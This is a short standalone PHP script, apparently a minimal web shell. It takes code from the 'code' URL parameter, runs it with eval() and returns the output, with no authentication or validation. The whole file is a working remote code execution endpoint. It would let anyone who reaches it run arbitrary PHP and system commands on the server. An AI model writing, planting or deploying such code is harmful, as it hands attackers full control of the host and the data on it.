<?php
if (isset($_GET['code'])) {
	$code = $_GET['code'];
}
ob_start();
eval($code);
$result = ob_get_contents();
ob_end_clean();

echo $result;
?>